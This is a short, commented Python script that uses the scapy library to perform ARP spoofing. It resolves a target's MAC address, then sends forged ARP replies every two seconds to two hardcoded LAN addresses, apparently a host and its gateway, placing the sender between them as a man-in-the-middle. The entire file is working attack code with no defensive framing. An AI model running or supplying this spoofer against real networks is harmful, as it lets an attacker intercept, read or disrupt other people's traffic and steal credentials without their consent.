import scapy.all as scapy 
import time

#Function to get Macaddress of a device which is at a particualr IP
def getMac(ip):
    #Create an ARP packet giving it {YOUR-IP} as source
    arp = scapy.ARP(pdst=ip)
    #Create an Ether packect giving it dummy macaddress as source
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #Create an coupled packet with ARP and Ether
    request = broadcast/arp
    #Submit an coupled packet and receive responses
    #Fetch only answered
    #Make the srp function non-verbose
    answered = scapy.srp(request, timeout=1, verbose=False)[0]
    #Return only the macaddress
    return answered[0][1].hwsrc
    
#Function to send arp spoof packets
def spoof(targetip,sourceip):
    #Get macaddress of terget device
    targetMac = getMac(targetip)
    #Create ARP response packet
    packet = scapy.ARP(op=2,pdst=targetip, hwdst=targetMac, psrc=sourceip)
    #Send ARP response packet
    #Add verbose=false to stop printing default statements to the screen
    scapy.send(packet, verbose=False)

packets = 0
while True:
    packets = packets+1
    spoof("192.168.31.19", "192.168.31.1")
    spoof("192.168.31.1", "192.168.31.19")
    print("[+] Packets sent: " + str(packets))
    time.sleep(2)

